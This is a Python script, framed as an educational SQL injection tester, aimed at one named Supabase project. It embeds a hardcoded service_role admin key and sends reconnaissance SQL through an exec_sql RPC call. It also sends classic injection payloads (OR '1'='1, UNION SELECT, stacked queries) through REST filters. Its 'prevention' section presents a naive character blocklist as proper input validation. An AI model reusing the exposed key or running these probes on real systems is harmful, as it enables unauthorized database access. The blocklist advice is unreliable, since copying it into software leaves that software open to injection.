#!/usr/bin/env python3
"""
SQL Injection Testing Script
Educational tool for demonstrating SQL injection vulnerabilities and prevention techniques.
For educational and authorized testing purposes only!
"""

import requests
import json
import logging

logging.basicConfig(level=logging.INFO)

class SQLInjectionTester:
    def __init__(self):
        """Initialize connection parameters for testing"""
        self.supabase_url = "https://ndrqixjdddcozjlevieo.supabase.co"
        self.supabase_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5kcnFpeGpkZGRjb3pqbGV2aWVvIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MDQ0OTUxNywiZXhwIjoyMDY2MDI1NTE3fQ.q-Y8Za1pKPb7_HOYwA-nOLk9QUYP5PGzyfoO7b8Bbmo"
        
        self.headers = {
            "apikey": self.supabase_key,
            "Authorization": f"Bearer {self.supabase_key}",
            "Content-Type": "application/json"
        }
    
    def test_basic_select(self):
        """Test basic SELECT query via REST API"""
        try:
            print("\n=== Basic SELECT Test ===")
            # Test connection by querying search_urls table
            url = f"{self.supabase_url}/rest/v1/search_urls?limit=3"
            response = requests.get(url, headers=self.headers)
            
            if response.status_code == 200:
                data = response.json()
                print(f"✅ Connection successful. Found {len(data)} search URLs")
                return True
            else:
                print(f"❌ Connection failed: {response.status_code}")
                print(f"Error: {response.text}")
                return False
        except Exception as e:
            print(f"Basic select failed: {e}")
            return False
    
    def test_rpc_sql_injection(self):
        """Test SQL injection via Supabase RPC if available"""
        print("\n=== RPC SQL Injection Test ===")
        
        # Test basic information gathering queries
        test_queries = [
            "SELECT 1 as test",
            "SELECT current_user as user_info",
            "SELECT version() as db_version",
            "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 5",
        ]
        
        for query in test_queries:
            try:
                # Attempt to use RPC to execute raw SQL
                url = f"{self.supabase_url}/rest/v1/rpc/exec_sql"
                payload = {"query": query}
                
                response = requests.post(url, headers=self.headers, json=payload)
                
                print(f"\nQuery: {query}")
                print(f"Status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"✅ Query executed: {data}")
                else:
                    print(f"❌ Query failed: {response.text}")
                    
            except Exception as e:
                print(f"RPC test error: {e}")
    
    def test_filter_injection(self):
        """Test SQL injection through REST API filters"""
        print("\n=== Filter Injection Tests ===")
        
        # Test various filter injection attempts
        filter_payloads = [
            "test'; SELECT * FROM information_schema.tables; --",
            "test' OR '1'='1",
            "test' UNION SELECT table_name FROM information_schema.tables --",
        ]
        
        for payload in filter_payloads:
            try:
                # Test filter injection on search_urls table
                url = f"{self.supabase_url}/rest/v1/search_urls?url=eq.{payload}"
                response = requests.get(url, headers=self.headers)
                
                print(f"\nFilter payload: {payload}")
                print(f"Status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"Response: {len(data)} results")
                else:
                    print(f"Error: {response.text}")
                    
            except Exception as e:
                print(f"Filter injection error: {e}")
    
    def demonstrate_prevention_techniques(self):
        """Show SQL injection prevention techniques"""
        print("\n=== Prevention Techniques ===")
        print("1. ✅ Use parameterized queries/prepared statements")
        print("2. ✅ Input validation and sanitization")
        print("3. ✅ Use ORM methods instead of raw SQL")
        print("4. ✅ Principle of least privilege for database users")
        print("5. ✅ Regular security audits and penetration testing")
        print("6. ✅ Use allow-lists for input validation")
        print("7. ✅ Escape special characters properly")
        
        # Example of proper input validation
        def validate_input(user_input):
            """Basic input validation example"""
            dangerous_chars = ["'", '"', ";", "--", "/*", "*/", "xp_", "sp_", "DROP", "DELETE"]
            for char in dangerous_chars:
                if char.lower() in user_input.lower():
                    print(f"⚠️  Dangerous pattern detected: {char}")
                    return False
            return True
        
        print("\n=== Input Validation Example ===")
        test_inputs = [
            "normal_username",
            "admin'; DROP TABLE users; --",
            "'OR'1'='1",
            "test_user",
        ]
        
        for test_input in test_inputs:
            is_safe = validate_input(test_input)
            print(f"Input '{test_input}': {'✅ Safe' if is_safe else '❌ Blocked'}")

if __name__ == "__main__":
    print("🛡️  SQL Injection Testing Tool")
    print("For educational and authorized testing purposes only!")
    print("⚠️  Only use on systems you own or have explicit permission to test!")
    print("=" * 60)
    
    tester = SQLInjectionTester()
    
    # Run all tests
    tester.test_basic_select()
    tester.test_rpc_sql_injection()  
    tester.test_filter_injection()
    tester.demonstrate_prevention_techniques()
    
    print("\n" + "=" * 60)
    print("🔒 Testing complete. Remember: Only test on authorized systems!")
    print("📚 Use these techniques to secure your own applications.")